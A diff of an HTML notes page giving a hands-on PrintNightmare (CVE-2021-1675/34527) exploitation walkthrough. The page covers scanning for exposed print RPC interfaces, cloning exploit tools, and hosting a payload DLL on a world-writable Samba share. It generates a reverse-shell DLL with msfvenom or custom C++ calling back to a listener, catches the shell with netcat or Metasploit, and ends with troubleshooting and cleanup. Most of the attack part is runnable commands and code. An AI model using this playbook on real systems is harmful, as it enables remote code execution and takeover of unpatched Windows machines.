@@ -3,7 +3,7 @@
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=generator content="Hugo 0.88.1">
-<meta name=description content="printnightmare description.">
+<meta name=description content="printnightmare, print all the shells.">
 <meta name=author content="Justin Perdok">
 <link rel=icon href=/images/favicon.png type=image/png>
 <title>printnightmare :: My notes and snippets</title>
@@ -1141,11 +1141,16 @@ Hugo
 <li><a href=#it-was-all-a-dream>It Was All A Dream</a></li>
 </ul>
 </li>
-<li><a href=#setup-tool-for-remote-rce-cve-2021-1675-cve-2021-34527>Setup tool for remote RCE (CVE-2021-1675, CVE-2021-34527)</a></li>
-<li><a href=#usage>Usage</a>
+<li><a href=#setup-tool-for-remote-rce-cube0x0>Setup tool for remote RCE (cube0x0)</a>
 <ul>
-<li><a href=#check-if-system-reaches-out>Check if system reaches out</a></li>
-<li><a href=#exploit>Exploit</a></li>
+<li><a href=#host-dll>Host Dll</a></li>
+</ul>
+</li>
+<li><a href=#outflanks-implementation>Outflanks implementation</a></li>
+<li><a href=#create-dll>Create DLL</a>
+<ul>
+<li><a href=#msfvenom>MSFVenom</a></li>
+<li><a href=#custom-simple-c-reverse-shell-example>Custom simple C++ reverse shell example</a></li>
 </ul>
 </li>
 </ul>
@@ -1165,6 +1170,7 @@ Hugo
 <p>A user account. (privs don&rsquo;t mather)</p>
 <h2 id=scan>Scan</h2>
 <h3 id=rpc-dump>RPC Dump</h3>
+<p>If you can reach these RPC interfaces you might be able to use printnightmare.</p>
 <pre><code class=language-bash>rpcdump.py @ip | egrep 'MS-RPRN|MS-PAR'
 </code></pre>
 <p><img src=images/rpcdump.png alt=rpcdump></p>
@@ -1173,68 +1179,24 @@ Hugo
 <pre><code class=language-bash>git clone https://github.com/byt3bl33d3r/ItWasAllADream
 cd ItWasAllADream &amp;&amp; docker build -t itwasalladream .
 docker run -it itwasalladream -u user -p password -d domain 192.168.1.0/24
+docker cp &lt;container-id&gt;:/report_XXXXXXX ./
 </code></pre>
-<h2 id=setup-tool-for-remote-rce-cve-2021-1675-cve-2021-34527>Setup tool for remote RCE (CVE-2021-1675, CVE-2021-34527)</h2>
+<h2 id=setup-tool-for-remote-rce-cube0x0>Setup tool for remote RCE (cube0x0)</h2>
+<p>Ensure you have a impacket version that has <a href=https://github.com/SecureAuthCorp/impacket/pull/1109>this PR</a> merged.</p>
 <pre><code class=language-bash>mkdir printnightmare
 cd printnightmare
 mkdir payloads
-git clone https://github.com/cube0x0/CVE-2021-1675
-git clone https://github.com/cube0x0/impacket
-apt install python3-venv
-python3 -m venv printnightmare-venv
-source printnightmare-venv/bin/activate
-cd impacket
-pip3 install -r requirements.txt
-python3 setup.py install
-cd ..
-cd CVE-2021-1675
-wget https://raw.githubusercontent.com/citronneur/CVE-2021-1675/main/CVE-2021-1675.py -O printnightmare.py
+git clone https://github.com/justin-p/CVE-2021-1675
 </code></pre>
-<h2 id=usage>Usage</h2>
-<pre><code class=language-bash>python3 printnightmare.py 'domain/user:pass@ip' PrinterName '\\IP_of_SMB_share\share\printer.dll'
+<p>Then if you are lazy just use the <a href=https://taskfile.dev/#/>Taskfile</a> inlclude in the repo.</p>
+<pre><code class=language-bash>task payload_folder
+task printnightmare_samba_share
 </code></pre>
-<h3 id=check-if-system-reaches-out>Check if system reaches out</h3>
-<p>By simply trying to connect to a nc instance we can verify that the system can reach our smb server.</p>
-<p>Start nc on 445.</p>
-<pre><code class=language-bash>sudo nv -nlvp 445
+<p>To restore the smb.conf and stop the service run</p>
+<pre><code class=language-bash>task restore_samba
 </code></pre>
-<p>Run printnightmare and try to connect to nc.</p>
-<pre><code class=language-bash>python3 printnightmare.py 'user:pass@ip' PrinterName '\\IP_of_SMB_share\share\printer.dll'
-</code></pre>
-<p><img src=images/test_if_system_reaches_out.png alt=test_if_system_reaches_out></p>
-<h3 id=exploit>Exploit</h3>
-<div class="notices warning"><p>Ensure that the first thing you do is restart the spooler service. Spooler services sometimes crashes/hangs and from my experience you wont be able to run printnightmare a second time if you don&rsquo;t restart the spooler service.</p>
-</div>
-<h4 id=create-dll>Create DLL</h4>
-<p>MSVenom is you think AV is not a problem. Otherwise build something custom.</p>
-<h5 id=custom-simple-c-reverse-shell-example>Custom simple C++ reverse shell example</h5>
-<p>Install C++ tools in visual studio.</p>
-<p>Create new project with Dynamic-Link Libary template.</p>
-<p>Download the <code>plain_revshell.cpp</code> file and paste the content into the existing template.</p>
-<section class=attachments>
-<label>
-<i class="fas fa-paperclip" aria-hidden=true></i>
-Related files
-</label>
-<div class=attachments-files>
-<li>
-<a href=/guides/printnightmare/files/plain_revshell.cpp>
-plain_revshell.cpp
-</a>
-(1 kb)
-</li>
-</div>
-<p>Update the RHOST & RPORT on StartCallback</p>
-<pre><code class=language-cpp>BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
-	switch (dwReason) {
-	case DLL_PROCESS_ATTACH:
-		StartCallback(&quot;172.16.0.137&quot;, 80); // &lt;- update this
-</code></pre>
-<p>Build the release (ctrl+shift+b)</p>
-<p>Place the DLL in the payloads folder</p>
-<h5 id=outflank-reflective-dll-implementation>Outflank Reflective Dll implementation</h5>
-<p><a href=https://github.com/outflanknl/PrintNightmare>https://github.com/outflanknl/PrintNightmare</a></p>
-<h4 id=host-dll>Host Dll</h4>
+<p>Otherwise use the steps below</p>
+<h3 id=host-dll>Host Dll</h3>
 <p>Make a backup of your smb.conf</p>
 <pre><code class=language-bash>sudo cp /etc/samba/smb.conf etc/samba/smb.conf.bak
 </code></pre>
@@ -1256,34 +1218,96 @@ plain_revshell.cpp
 </code></pre>
 <p>Ensure the files are owned by nobody</p>
 <pre><code class=language-bash>sudo chown nobody:user -R /home/user/Documents/printnightmare/payloads/
-sudo chmod -R 470 /home/user/Documents/printnightmare/payloads/
+sudo chmod -R 777 /home/user/Documents/printnightmare/payloads/
 </code></pre>
 <p>Restart the smbd service</p>
 <pre><code class=language-bash>sudo service smbd restart
 </code></pre>
+<div class="notices warning"><p>Don&rsquo;t forget to restore the SMB config and disable the service :)</p>
+</div>
 <pre><code class=language-bash>sudo cp /etc/samba/smb.conf etc/samba/smb.conf.bak
-sudo service smbd restart
+sudo service smbd stop
 </code></pre>
-<h4 id=run-the-exploit>Run the Exploit</h4>
-<p>Setup a listner</p>
-<h5 id=netcat>Netcat</h5>
-<pre><code class=language-bash>nc -nlvp 80
+<h2 id=outflanks-implementation>Outflanks implementation</h2>
+<p><a href=https://github.com/outflanknl/PrintNightmare>https://github.com/outflanknl/PrintNightmare</a></p>
+<p>Did not test this yet. But seems &lsquo;better&rsquo; then the cube0x0 implementation</p>
+<h2 id=create-dll>Create DLL</h2>
+<p>MSVenom is you think AV is not a problem. Otherwise build something custom.</p>
+<h3 id=msfvenom>MSFVenom</h3>
+<pre><code class=language-bash>msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=&lt;YOUR IP&gt; LPORT=&lt;PORT TO LISTEN&gt; -f dll -o /home/user/Documents/printnightmare/payloads/rev.dll
 </code></pre>
-<h5 id=msf-multi-handler>MSF multi handler</h5>
-<pre><code class=language-bash>msfconsole -x &quot;use exploit/multi/handler;\
-set payload generic/shell_reverse_tcp;\
-set LHOST 172.16.0.137;\
-set LPORT 80;\
-set ExitOnSession false;\
-run -j&quot;
+<h3 id=custom-simple-c-reverse-shell-example>Custom simple C++ reverse shell example</h3>
+<ol>
+<li>
+<p>Install C++ tools in visual studio.</p>
+</li>
+<li>
+<p>Create new project with Dynamic-Link Libary template.</p>
+</li>
+<li>
+<p>Download the <code>plain_revshell.cpp</code> file and paste the content into the existing template.</p>
+</li>
+</ol>
+<section class=attachments>
+<label>
+<i class="fas fa-paperclip" aria-hidden=true></i>
+Related files
+</label>
+<div class=attachments-files>
+<li>
+<a href=/guides/printnightmare/files/plain_revshell.cpp>
+plain_revshell.cpp
+</a>
+(1 kb)
+</li>
+</div>
+<ol start=4>
+<li>Update the RHOST & RPORT on StartCallback</li>
+</ol>
+<pre><code class=language-cpp>BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+	switch (dwReason) {
+	case DLL_PROCESS_ATTACH:
+		StartCallback(&quot;172.16.0.137&quot;, 80); // &lt;- update this
 </code></pre>
-<p>Now run the printnightmare.py.</p>
-<pre><code class=language-bash>python3 printnightmare.py 'domain/user:pass@ip' PrinterName '\\IP_of_SMB_share\share\printer.dll'
+<ol start=5>
+<li>
+<p>Build the release (ctrl+shift+b)</p>
+</li>
+<li>
+<p>Place the DLL in the payloads folder</p>
+</li>
+</ol>
+<h2 id=usage>Usage</h2>
+<pre><code class=language-bash>python3 [MSPAR|MSRPRN|MSRPRN_nobrute].py 'domain/user:pass@ip' PrinterName '\\IP_of_SMB_share\share\printer.dll'
 </code></pre>
-<pre><code class=language-bash>net stop spooler &amp;&amp; net start spooler
-</code></pre>
-<p><img src=images/run_printnightmare.png alt></p>
-<h4 id=errors--tips>Errors & tips</h4>
+<p>There are 3 different version. All versions have been updated to support a custom driver/printername.</p>
+<table>
+<thead>
+<tr>
+<th>Version</th>
+<th>Info</th>
+<th>When to use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MSPAR</td>
+<td>Abuses MSPAR</td>
+<td>When ItWasAllADream says its vulnerable</td>
+</tr>
+<tr>
+<td>MSRPRN</td>
+<td>Abuses MSRPRN</td>
+<td>When ItWasAllADream says its vulnerable</td>
+</tr>
+<tr>
+<td>MSRPRN_nobrute</td>
+<td>Abuses MSRPRN but does not brute force driver folders, see <a href=https://github.com/cube0x0/CVE-2021-1675/pull/25>this pull</a></td>
+<td>When ItWasAllADream says its vulnerable but it does not seem to work and you tried everything listed in <code>Errors & tips</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id=errors--tips>Errors & tips</h3>
 <table>
 <thead>
 <tr>
@@ -1317,20 +1341,52 @@ run -j&quot;
 <td>Seems like the host is patched</td>
 </tr>
 <tr>
+<td>RPRN SessionError: code: 0x43 ERROR_BAD_NET_NAME</td>
+<td>Wrong share name used in printnightmare or typo in samba config</td>
+</tr>
+<tr>
 <td>SMB SessionError: STATUS_PIPE_BROKEN</td>
-<td>Print spooler service crashed during payload execution. Start the spooler if you got a shell (PowerShell -> <code>start-service spooler</code>. CMD -> <code>net start spooler</code>)</td>
+<td>Print spooler service crashed during payload execution. Restart the spooler if you got a shell (PowerShell -> <code>Restart-Service spooler</code>. CMD -> <code>net stop spooler && net start spooler</code>)</td>
 </tr>
 <tr>
 <td>After killing the session the payload does not work a second time</td>
 <td>Always ensure the first thing you do is restart the spooler service upon a shell connect. If you did this, use a different printername. Otherwise ur fuk&rsquo;d</td>
 </tr>
 <tr>
-<td>When removing the print drivers using <code>Print Server Properties</code> the dll will execute again.</td>
-<td>Nothing, just something to be aware of.</td>
+<td>Sometimes when removing the print drivers the dll will execute again. This means your payload will run again.</td>
+<td>Nothing, just something to be aware of if you use a payload that adds a user or w.e.</td>
 </tr>
 </tbody>
 </table>
-<h3 id=cleanup>cleanup</h3>
+<h3 id=check-if-system-reaches-out>Check if system reaches out</h3>
+<p>By simply trying to connect to a nc instance we can verify that the system can reach our smb server.</p>
+<p>Start nc on 445.</p>
+<pre><code class=language-bash>sudo nv -nlvp 445
+</code></pre>
+<p>Run MSRPRN_nobrute and try to connect to nc.</p>
+<pre><code class=language-bash>python3 MSRPRN_nobrute.py 'user:pass@ip' PrinterName '\\IP_of_SMB_share\share\printer.dll'
+</code></pre>
+<p><img src=images/test_if_system_reaches_out.png alt=test_if_system_reaches_out></p>
+<h3 id=exploit>Exploit</h3>
+<h4 id=setup-a-listener>Setup a listener</h4>
+<h5 id=netcat>Netcat</h5>
+<pre><code class=language-bash>nc -nlvp 80
+</code></pre>
+<h5 id=msf-multi-handler>MSF multi handler</h5>
+<pre><code class=language-bash>msfconsole -x &quot;use exploit/multi/handler;\
+set payload generic/shell_reverse_tcp;\
+set LHOST 172.16.0.137;\
+set LPORT 80;\
+set ExitOnSession false;\
+run -j&quot;
+</code></pre>
+<h4 id=run-printnightmare>Run printnightmare</h4>
+<pre><code class=language-bash>python3 [MSPAR|MSRPRN|MSRPRN_nobrute].py  'domain/user:pass@ip' PrinterName '\\IP_of_SMB_share\share\printer.dll'
+</code></pre>
+<pre><code class=language-bash>net stop spooler &amp;&amp; net start spooler
+</code></pre>
+<p><img src=images/run_printnightmare.png alt></p>
+<h3 id=cleanup>Cleanup</h3>
 <h4 id=powershell>PowerShell</h4>
 <h5 id=load-printmanagement-ps-module-should-be-loaded-by-default-on-w10>Load PrintManagement PS Module (should be loaded by default on W10)</h5>
 <pre><code class=language-PowerShell>Import-Module PrintManagement
@@ -1341,12 +1397,33 @@ run -j&quot;
 <h5 id=remove-print-drivers>Remove print drivers</h5>
 <pre><code class=language-PowerShell>Get-PrinterDriver -Name PrinterName
 </code></pre>
-<h5 id=oneliner-to-clean-up>Oneliner to clean up</h5>
-<p>Watch out, <code>Where-Object</code> uses Wildcards to get both drivers that get installed (<code>PrinterName0</code>, <code>PrinterName1</code>). Make sure it does not match existing print drivers, clean manually. Also make sure to update the DLLNAME so the actual uploaded file gets removed.</p>
-<p>Error <code>HRESULT 0x800706be</code> on Remove-PrintDriver can happen. This is due the print spooler crashing.</p>
-<pre><code class=language-PowerShell>Start-Service Spooler;Import-Module PrintManagement;Get-PrinterDriver | Where-Object {$_.Name -like &quot;*PrinterName*&quot;} | Remove-PrinterDriver;Start-Service Spooler;Start-Sleep -s 2;Get-PrinterDriver;Remove-Item &quot;C:\windows\system32\spool\drivers\x64\3\DLLNAME.dll&quot;
+<h5 id=oneliner>Oneliner</h5>
+<p>Watch out, <code>Where-Object</code> uses Wildcards to get both drivers that get installed (<code>PrinterName0</code>, <code>PrinterName1</code>). Also, make sure to update the <code>dllname.dll</code> in the <code>Get-Item</code> action.</p>
+<pre><code class=language-PowerShell>Restart-Service Spooler;Import-Module PrintManagement;Get-PrinterDriver | Where-Object {$_.Name -like &quot;*PrinterName*&quot;} | Remove-PrinterDriver;Stop-Service spooler;Start-Sleep -s 2;Get-Item 'C:\windows\system32\spool\drivers\x64\3\New\','C:\windows\system32\spool\drivers\x64\3\Old\','C:\windows\system32\spool\drivers\x64\3\dllname.dll' -ErrorAction SilentlyContinue | Remove-Item;Start-Service spooler;Start-Sleep -s 2;Get-PrinterDriver
 </code></pre>
 <h3 id=mitigation>Mitigation</h3>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RCE MSRPRN</td>
+<td>Update Windows</td>
+</tr>
+<tr>
+<td>RCE MSPAR</td>
+<td>Update Windows</td>
+</tr>
+<tr>
+<td>LPE</td>
+<td>Not tested yet</td>
+</tr>
+</tbody>
+</table>
 </section>
 <footer class=footline>
 </footer>
